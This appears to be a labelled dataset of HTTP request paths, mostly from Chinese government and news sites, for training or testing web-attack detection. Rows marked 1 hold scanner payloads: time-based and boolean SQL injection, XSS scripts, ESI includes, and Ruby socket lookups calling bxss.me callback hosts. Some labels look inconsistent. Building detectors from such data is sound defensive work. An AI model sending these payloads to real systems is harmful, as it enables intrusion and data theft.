request	label
/****/category/touzizixun?page=1 and 2634=2634#	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u751f\u7ea2\u673a\u7816\u5382	0
/**********/system/2020/09/13/javascript:window.print()	1
/****/qzfwj/201801/t20180115_669185.html	0
/****/system/2021/12/19/javascript:window.print()	1
/***/003/004/477/00300447798_6e4ce1c7.png	0
/zwxx_11337/****/202003/t20200312_1987508.html	0
/**********/system/2021/12/20/013496860.shtml	0
"/****/web/search?page=2&channelid=253477&searchword=1&keyword=1 if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""""xor(if(now()=sysdate(),sleep(6),0))or""""*/&orderby=-docreltime&perpage=15&outlinepage=10"	1
/******/download/downfile.jsp?classid=0&filename=fb57a91cda9f46b8840d5b0998b2ed22.docx	0
/**/resetpwd/	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7ea2\u8272\u529b\u91cf	0
/****/b-e290439.html	0
/*****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777)	1
/****/jtdt/2020_jtyw/202006/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/****/gfxwj/list_60.html	0
/****/pic/lc.jpg	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(119).concat(85).concat(111).concat(87) (require""""socket""""
socket.gethostbyname(""""hitde"""" """"mluirsua1ba1e.bxss.me."""")[3].to_s) """"/****/10/11/art_34_242318.html"	1
/*****/system/2021/11/17/javascript:void();	1
/******/index.html	0
/******/scy_gjldgh_xk_03.png	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9648\u78ca\u8d27\u8fd0\u90e8	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u5f00	0
/***/003/004/505/00300450528_7d3ea32f.png	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12007,""place_id"":""fm_sp_ard"",""news_id"":""1264978""}"	0
/**********/system/2021/12/11/013493029.shtml	0
/xwzx'||'/****/2021_mtgz/202105/t20210505_273338.html	1
/*****/gy42/ljcpgyview.asp?id=29395745&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/fewcls-syxw-e112022659.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6492\u6dd1\u5a1f\u670d\u88c5\u5e97	0
/****/yjh/ldyl/	0
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/0513/623244.shtml	0
/*******/201906031052452847	0
"/******/jslib/'""""()&%<acx><script >gejm(9283)</script>/jquery.ad-gallery.js"	1
/****/xxgkml/gfgy/ghbg/wngh/202107/w020180116728488315065.jpg	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5218\u82f1\u5927\u8089\u5e97	0
/jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/voice/voicerecorder.js	1
/****/zbyfyzz/images/p020141128492381666166.jpg	0
/****/system/2020/07/21/javascript:void();	1
/****/xxgkzd/list.html?new=/xfs.bxss.me	1
/****************/notification/negotiate?access_token=8fd58784-ae19-452e-9f59-9a9a82cac34a	0
/**/ybtbgypd/	0
/****/ghgz/index_1.html	0
/*******/202007/202007222122341228.html	1
/*******/qiye/b-e2396462.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u65fa\u739b\u7279\u767e\u8d27\u8d85\u5e02	0
/**********/system/2021/12/18/013496281.shtml	0
/*****/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25	1
/zwxx_11337/****/202004/t20200415_2021624.html	0
"/****/ºı∆∂?page='""""()&%<acx><script >zsnv(9860)</script>"	1
/**********/system/2015/11/06/011857981.shtml	0
/****/zfcwhy/index_8.html	0
"/****/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/**********/system/2020/01/25/013064112.shtml	0
/******/visitcount/visit.jsp?i_webid[0]==extractvalue(1,concat(char(126),md5(1585232043)))and 3 in &i_columnid=1&i_webid[1]=3&type=1	1
/**********/system/2021/12/20/013497007.shtml	0
/****/\ufffd\u01fc\ufffd\ufffd\ufffd\u00b7	0
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202106/t20210601_183377_wap.html	0
/******/system/2021/11/26/013486058.shtml	0
"/******/visitcount/visit.jsp?i_articleid=242398&i_columnid=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&i_webid=1&type=3"	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqgzw/202108/t20210818_2979754.html	0
/*****/20210929/h1528752393.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\u0735\ufffd\ufffd\u8eb8\ufffd\ufffd&order=1	0
/****/system/2012/09/02/010873161.shtml	0
/*****/gy48/cpgyss.asp?key=\u81ea\u5438\u6cf5\u4ef7\ufffd?&l=\u0328\ufffd\ufffd	0
/******/nxrq_ysq_icon1.png	0
/****/zjdt/csjs/gzdt/13.htm	1
/****/rsrm/201506/w020170728621809604327.jpg	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 4576=4576 and '%%'='%	1
/***/gygj/dszzc/xwzx/szyw/yqlj/bqsm/yqlj/xxgk/zycwxx/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e60\u6e3c\u517b\u6b96\u519c\u6c11\u4e13\u4e1a\u5408\u4f5c\u793e	0
/**********/2021-if(now()=sysdate(),sleep(9),0)-02 .html	1
/****/wdsjs/hfswsj/202109/t20210916_186684.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9999\u798f\u83b1\u84b8\u9999\u9e2d\u5e97	0
/****/wdszs/hfsz/zmhdyc_1.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(390)"">?_=1630311387505"	1
/***/index.php?do=post&id=419&c=dt&a=goods&	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8212\u82d1\u8db3\u6d74\u5e97	0
/zwxx_11337/****/index_6.html	0
/************/recommend/census.do?redirectaction:http://static.bxss.me/	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5fb7\u76db\u697c\u9910\u996e\u6709\u9650\u516c\u53f8\u4e00\u5206\u5e97	0
/***/460599.html	0
/**/system/2021/05/27/012164420.shtml	0
/****/201909/t20190926_1757105.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u6c90\u89c6\u4f73\u773c\u955c\u5e97	0
/*******/admin/index.php?o=panel&a=receiver.edit&id=alert(777)	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/****/jzgl/gzdt/1.htm"	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/201907/t20190719_161671.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\u01b6\ufffd\ufffd\ufffd&l=\ufffd\u03fa\ufffd	0
/****/qzfwj/202111/p020211110611650235806.zip	0
/zwxx_11337/****/202007/t20200727_2172531.html	0
/*******/201902/201902272013511138.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e2a\u4f53\u7ecf\u8425\u4f17\u8054\u901a\u8baf\u4e13\u8425\u5e97	0
/*******/qiye/b-e2378059.html	0
/zwfw' and 2*3*8=6*8 and 'xsle'='xsle/****/1.htm	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u597d\u8bc4\u8fd4\u73b0	0
"/****/qzfwj/202001/""></a>-->"	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6307	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u783e\u6d77\u5546\u52a1\u54a8\u8be2\u6709\u9650\u516c\u53f8	0
"/***/admin/ccmanage.php?find_enc=1&list=1""><script>alert(777)</script>"	1
/****/bmkx/sgsj/202112/w020211220638365320340.jpg	0
"/*/doinfo/addinfo.php?submit=ÃÌº”–≈œ¢&classid=1&enews=maddinfo&mid='""""()&%<acx><script >87cm(9833)</script>"	1
/**/system/2007/11/12/002251022.shtml	0
"/****/zfxxgk1/zfxxgkzd/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
/****/jgzn/znjs' and 2*3*8=6*8 and 'fbxf'='fbxf.htm	1
"/****/zfxxgk<esi:include src=""""http://bxss.me/rpb.png""""/>/fdzdgknr/qtfdxx/"	1
"/******/"""" """"a"""".concat(70-3).concat(22*4).concat(101).concat(81).concat(118).concat(84) (require""""socket""""
socket.gethostbyname(""""hitui"""" """"aajxzmgw587ed.bxss.me."""")[3].to_s) """"/jquery.db_tabmotionbanner.min.js"	1
/**********/system/2020/05/06/013155479.shtml	0
/*****/20171031/3898.html	0
"/************/template/jcse/110105008056111/16/images/plugin/websitechange/zwfwv3.js/""""><script>alert(4710)</script>"	1
/zwxx_11337/****/202006/t20200619_2142677.html/index_1.html	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u9e3f\u7965\u8d27\u7269\u8fd0\u8f93\u90e8	0
/****/b-e1281597.html	0
/****/szyw/2020_szyw/ and 1=1	1
/************/template/jcse/110105008056111/**/and/**/7659=7659/16/images/view.js	1
"/************/template/jcse/110105008056111/16/'""""()&%<acx><script >qamc(9033)</script>/main.css"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u5173\u6865\u4e61\u6587\u6d77\u4e94\u91d1\u90e8	0
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=bxss.me/t/xss.html?	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4f17\u7f18\u5c0f\u53a8\u5a18\u8fa3\u7cca\u7cca\u5e97	0
/*******/qiye/spots-e12832.html	0
/******/ld_cxkj_pic03_13.png	0
/***/interface/daily_clickcount.json.jsp?callback=jquery191044105076129039245_1640054269565	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u8d5b\u7855\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/****/byszf/http://bxss.me/t/fit.txt?.jpg/202108/t20210806_185416.html	1
/**********/system/2021/12/17/013495884.shtml	0
/****/system/2017/04/05/javascript:window.print()	1
/zwxx_11337/****/zzlist_4.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u4e2d\u8fd0\u8fbe\u8fd0\u8f93\u6709\u9650\u516c\u53f8	0
/**********/system/2021/12/14/013494046.shtml	0
/****/xxgknb/2016/bmnb2016/201703/t20170327_86857.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5144\u5f1f\u8d85\u5e02	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5434\u6c5f	0
/******/20190808'; select @@version,1,1,1--.swf	1
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd  \ufffd\ufffd\ufffd\ufffd	0
"/************/template/jcse/110105008056111/' 'a'.concat(70-3).concat(22*4).concat(115).concat(73).concat(118).concat(78) (require'socket'
socket.gethostbyname('hitcx' 'aetwgyshf3a9b.bxss.me.')[3].to_s) '/images/result.css"	1
/*****/dmqh/images/16.gif	0
"/**/index.php?show_record_links=1&table=products"""">alert(777);&add_new_item=1"	1
/****/mytag_js.php?aid=6022	1
"/****/zfwjn/1088/1091/list.html?new=0.23628304015921864'""""()&%<acx><script >grpf(9380)</script>"	1
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6216	0
/****/tzgg/index_2.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtlnh97fobgvshnuo0aj flk=&openid=ovl7jjp-uxp6opcjite3nd_p9z10&outer_str=54624&activate_ticket=fdzv9emqaffrnr3xboqhb5ezgkvjwhu0kgbhtqucf7dhfifidrt1ejnprxbtx1zvso/igqkn2ovccrd k80diq8ihcnm324mxermnawavyy=	0
/****/zhengce/zfwjn/201801/t20180116_99249.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 4394=0062 and '1'='1	1
/****************/images/crm/default/my/me_btn_me_parking_payment.png	0
/***/0/02/12/33/2123369_468717.jpg	0
/*******/qiye/b-e2560788.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e01\u71d5\u8d27\u7269\u8fd0\u8f93\u90e8	0
/******/system/2021/09/10/javascript:window.print()	1
/****/system/2008/01/04/javascript:window.print()	1
/****/jtdt/2021_jtyw/202111/t20211118_321465.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6f58\u6625\u534e\u82f9\u679c\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/web/search?page=5&channelid=222832&searchword=\u59dc\u5fd7\u521a&keyword=\u59dc\u5fd7\u521a&perpage=20&outlinepage=10	0
/****/\ufffd\ufffd\u01e2\ufffd\ufffd	0
/****/czgk/bmjs/zzqfyxt/ycszjrmfy	0
"/****/gfxwj/201904/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/zgsdt/2021_qydt/202102/t20210208_270482.html	0
/*******/images/css.css	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u540d\u76db\u7cae\u6cb9\u852c\u83dc\u7ecf\u9500\u5e97	0
/****/bmkx/srsj/201702/t20170223_85822.html	0
/****/xh/hd/201705/t20170501_313502.html	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/ywdt/11.htm"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u660e\u51e4\u5e73\u4ef7\u5546\u5e97	0
/zwxx_11337/****/202001/t20200108_1917776.html	0
"/**/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
/zwxx_11337/****/201911/t20191129_1866675.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u6b23\u60a6\u4e94\u91d1\u6c34\u6696\u5efa\u6750\u7ecf\u9500\u90e8	0
/**/system/2021/12/09/012228623.shtml	0
"/***/getsubject?data={""subject_id"":90,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":259,""sign"":""""}"	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7ea2\u5d16\u5b50\u4e61\u9876\u725b\u9aa8\u6c64\u62c9\u9762\u9986	0
"/*****/system/2021/01/21/013323672'""""/>%uff1cscript%uff1ealert%uff081143%uff09%uff1c/script%uff1e.shtml"	1
/*****/ywzzq/kjcx/xyfw/gygj/jtgg/dsh/xxgk/kjcx/xyfw/jcjg/kjcx/jsly/xwzx/zgsdt/gjcp/lyjx/images/jquery.superslide.2.1.1.js	0
/**********/system/2021/12/20/013496886.shtml	0
/**********/system/2021/10/08/013461385.shtml	0
/****/bmkx/styj/201709/w020170930547138556478.jpg	0
/******/xsd/javascript:void(0)	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5b66\u7434\u5409\u5229\u7efc\u5408\u95e8\u5e02\u90e8	0
/**********/system/more/204000000000000/0060/204000000000000_00006028.shtml	0
/***/images/02.jpg	0
/****/czgk/bmyjs/zzqfyxt/hsbrmfy/201802/t20180223_692772.html	0
/****/bmkx/sfgw/201706/t20170602_90833.html	0
"/****/category/siluyiliao?page=1'""()&%<acu><script>9112(9131)</script>"	1
/**/phpwiki/index.php?pagename=</script><script>alert(777)</script><!--	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u8001\u8d75\u8c03\u6599\u6279\u53d1\u8d85\u5e02	0
/****/zdlygk/ncwywfgz/szss/plq/xmb_gzdxb%' and 2*3*8=6*8 and 'rneu'!='rneu%.htm	1
/**********/system/2021/10/17/013465385.shtml	0
/**********/system/2020/04/04/013131957.shtml	0
/****************/notification?access_token=0c7aa21f-09d5-4dae-88b5-1c40b0fd9377&id=undefined	0
/******/jslib'||'/grouppic/jquery.ad-gallery2.css	1
"/******/index.cfm?email="""">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u9171\u6cb9	0
/***/blockdata/getsearchinfo.do?&title=\u8c06\u8c06\u627f\u8bfa	0
/***/003/004/369/00300436903_e3505757.png	0
/****/category/gaocengdongtai?page=1' or 2462=2462 /*	1
/***/com/menu/images/t4-1.jpg	0
/**/bxss.me/lib/jquery/jquery.min.js	1
"/******/zh-cn/listbox/;""style='acu:expre/**/ssion(x4cp(9599))'bad="""	1
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/201705/w020171027370337384414.doc	0
/***/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/****/czgk/bmjs/rmtt/skl/201908/t20190808_1654825.html	0
/*/zwdhhz/index.shtml	1
"/***/getsubject?data={""subject_id"":68,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":394,""sign"":""""}"	0
"/****/' 'a'.concat(70-3).concat(22*4).concat(121).concat(76).concat(122).concat(83) (require'socket'
socket.gethostbyname('hitmx' 'htrncijocc232.bxss.me.')[3].to_s) '/hfswsj/zmhdyc.html"	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u57ce\u9547	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/gfxwj/list_38.html	0
/*******/201907040921267744	0
/*******/202104/202104160923431024.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6ee1\u515c\u5364\u8089\u5377\u5c0f\u5403\u5e97	0
/*****/system/2013/05/03/011077792.shtml	1
/**/system/2008/03/17/002450126.shtml	0
"/************/'""""()&%<acx><script >vpin(9807)</script>/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js"	1
/****/20210622/javascript:void(0);	1
/***/0/01/39/13/1391343_745998.jpg	0
/****/xxgknb/2015/bmnb2015/201603/t20160329_75936.html	0
/****/xydt/2012hydt/201412/t20141218_46949.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u9633\u5149\u4fbf\u5229\u5e97	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5c0f\u6ee1\u5546\u884c	0
/***/0/01/89/42/1894272_014831.jpg	0
/****/system/2021/11/24/javascript:dozoom(12)	1
/*****/system/2015/12/30/011901302.shtml	0
/****/zgsdt/2021_qydt/202108/t20210810_314161.html	0
/****/pucghtmain/dateconfirmation.z	0
/**************/2020-09-22/javascript:void(0)	1
/****/zdlygk/ncwywfgz%' and 2*3*8=6*8 and '0wrz'!='0wrz%/szss/plq/xmb_gzdxb.htm	1
/*****/system/2014/12/23/011591237.shtml?ivk_sa=1024320u	1
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/***/2021/3/23/art_41_227992.html	0
/****/system/2009/06/04/002750675.shtml	0
/******/public/2021/10/18/109483.images/v109483_b1634519494291_app.jpg	0
/***/0/02/05/58/2055837_725772.jpg	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zytxj/	0
/****/bmkx/swjw/201903/w020190322614918788854.jpg	0
/****/yzw/ldhd	0
/***********/zaojianpinglun/?_=1640025105347	0
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqxcb/index_1.html	0
/***********/lianghuayanjiu/2017-02-16/227.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5149\u8f89\u5e7f\u544a\u88c5\u9970\u90e8	0
/****/system/2020/12/09/012101017.shtml	0
/**/sydt/201808/t20180808_194915.html' and 'x'='y	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19105200038558303867_1639980498529	0
/zwxx_11337/****/202003/t20200320_1997443.html	0
/****/b-e585681.html	0
/*****/gjfz/1.shtml	0
/****/bxss.me/xxdj/	1
/****/wdsjs/hfswsj/202110	0
/******/rsrm/	0
/******/web/jpage/bxss.me.js	1
/*******/7jyc.php	1
/***/wxzcgk/202110/t20211009_3076385.html	0
/******/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/lzqh/qwjd/index_1.html	0
/***/0/00/35/48/354866_436916.jpg	0
/******/resource/js/news/if(now()=sysdate(),sleep(12),0).js	1
/******/nmgmtx/db/index.shtml	0
/***/0/01/85/67/1856710_892745.jpg	0
/**********/system/2021/01/28/013327741.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u7ea2\u9999\u7efc\u5408\u5546\u5e97	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u9b4f\u6865\u96c6\u56e2	0
/***/system/2006/09/26/000004244.shtml	0
/****/bmkx/sgaj/201805/w020180515618961427265.jpg	0
/****/qzfwj/201801/t20180115_668802.html	0
/****/\ufffd\ufffd\u02a6	0
/**/system/2021/12/17/012230904.shtml	0
/****/20200805/e104564799.html	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6d2a\u5e7f\u9547\u957f\u80dc\u7164\u70ad\u9500\u552e\u90e8	0
/****/xydt/2011hydt/201412/t20141218_47196.html	0
/*******/qiye/b-e1270489.html	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6d4e\u5357	0
/************/template/bxss.me/110105008056111/16/images/common.js	1
/**********/system/2020/09/18/013249619.shtml	0
/******/system/2008/03/18/002450898.shtml	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u6b23\u96f6\u7a97\u5e18\u5e97	0
/*****/?loginid=10001455&stamp=1639980240210&token=23dab9f26f05d03f1f594500fcc1352ec7ca24aa&hrn=10001455	0
/**********/system/2020/05/03/013154084.shtml	0
/****/ysqgk/sy.html?id=74	0
/***/2021/1/6/art_34_224840.html	0
"/**/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/***/0/01/88/99/1889989_838421.jpg	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201811/w020200505854445709905.doc	0
/****/zzxxgk/jjhzj/zsxm/zyzy/202101/t20210104_175529.html	0
/****/20200702/e103034635.html	0
/****/bmkx/snmj/202011/w020201104371950152878.png	0
/****/mavideo/gvideos.php?gid=1 and 1=2	1
/*****/gy48/cpgyss.asp?key=\ufffd\u0e66\ufffd\u0738\u05b9\u073d\ufffd\u05b1\ufffd\ufffd&order=1	0
/*****/asos-design-pocket-heels-black-1232076.html?35863.xml	0
/****/czgk/bmjs/zzqfyxt/zzqgyzzqtlfy_1817/202008/t20200818_2189698.html	0
/****/yqzt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/getsubject?vno=3.5.0°¡tamp=1640035755565&	0
/****/jtdt/2019_jtyw/201912/t20191209_240246.html	0
/****/gjjj/201608/t20160804_93597.html' and 'x'='y	1
/zwxx_11337/****/zcjd/202001/t20200108_1917659.html	0
"/*/201020-1/videos-detail/4e8c38de2e5ef1a81f429ac1992d4cf2'""""()&%<acx><script >ejwv(9896)</script>.css"	1
/**/system/2021/01/28/012122257.shtml	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5ca9\u817e\u517b\u6b96\u5382	0
/**********/system/2021/08/24/013439110.shtml	0
/****/fkxxfy/202109/w020210917430924220174.jpg	0
//***********/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list.html	1
/*/191211-8/index/543527http://bxss.me/t/xss.html?	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(4694)</script>?_=1630312101338"	1
/****/bmkx/ygjt/202102/w020210201610640636790.jpg	0
/**********/system/2020/03/27/013126550.shtml	0
"/****/index.php?show_record_links=1&table=products"""">alert(777);&add_new_item=1"	1
/****/xydt/2017hydt_6392/	1
/******/system/2021/03/09/013348153.shtml	0
/*****/gy48/cpgyss.asp?key=\ufffd\u06f0\ufffd\ufffd\ufffd\u0278\ufffd\ufffd&l2=\ufffd\ufffd\u027d&l=\ufffd\u04f1\ufffd	0
/**************/riqi.html	0
/***/0/02/01/68/2016895_361966.jpg	0
/**********/system/2011/12/29/010595032.shtml	0
/******/system/2020/07/24/013212252.shtml	0
/*****/image/qhnews2.ico	0
"/******/visitcount/visit.jsp?type=>""'><script>alert(2059)</script>&i_webid=>""'><script>alert(2059)</script>&i_columnid=>""'><script>alert(2059)</script>&i_articleid=>""'><script>alert(2059)</script>"	1
"/***/2021/' 'a'.concat(70-3).concat(22*4).concat(122).concat(74).concat(109).concat(65) (require'socket'
socket.gethostbyname('hitoi' 'kglbxleaf7bf3.bxss.me.')[3].to_s) '/11/art_34_242318.html"	1
/****/gjzqq/fz/jbbw/201412/w020141212374640221774.gif	0
/**********/system/2015/10/12/011838626.shtml	0
/****/gjhzjd/	0
/*******/zwgk/czgk/bmyjs/zzqdwzfbmgljgsydw/zytxj/	0
/***/mobile_h5/wapshouye.do?channelid=renwu/kejiao	0
/****/\ufffd\ufffd\ufffd\u03b2\ufffd\u01b7	0
/****/system/2013/08/10/011155505.shtml	0
/***********/jinrongqihuo/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_2.html	1
"/****/category/xinhuaqiyezixun?page='""""()&%<acx><script >dgqe(9340)</script>"	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202112/t20211209_197602.html	0
/*****/system/2016/05/06/011998587.shtml	0
/zwxx_11337/****/202008/t20200804_2178837.html	0
"/**/"""" """"a"""".concat(70-3).concat(22*4).concat(107).concat(78).concat(105).concat(76) (require""""socket""""
socket.gethostbyname(""""hitvw"""" """"svhrikna978d3.bxss.me."""")[3].to_s) """"/lib/easyui/plugins/jquery.panel.js"	1
/*****/003/004/499/00300449955_vw00000000000001_6f93c718.mp4	0
/****/goform/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test	1
/****/20210521/9879.html	0
/*******/0xnw6.php	1
/**/index.php?do=post&id=280&c=dt&a=goods&	1
/******/visitcount/visit.jsp?type=1'; select @@version,1,1,1--&i_webid=1&i_columnid=1	1
/****/ssgs/ and 1=1	1
/****/202011/t20201125_256647.html	0
/****/zt/yqfkzccs/dsjzccs/szsszc/	0
/****/index_3.html	0
"/****/bysrd/201612/t20161202_79141.html?leader=' 'a'.concat(70-3).concat(22*4).concat(105).concat(80).concat(98).concat(73) (require'socket'
socket.gethostbyname('hitec' 'rcijimzvd76d3.bxss.me.')[3].to_s) '"	1
/****/category/zhixun?page=1 and 6768=6768#	1
/****/byysqgk' and 2*3*8=6*8 and 'hoa6'='hoa6/ybjsqzn/list.html	1
/***/xm/menu/images/book.gif	0
/**********/system/2020/06/19/013189108.shtml	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw_1815/201609/t20160922_317870.html	0
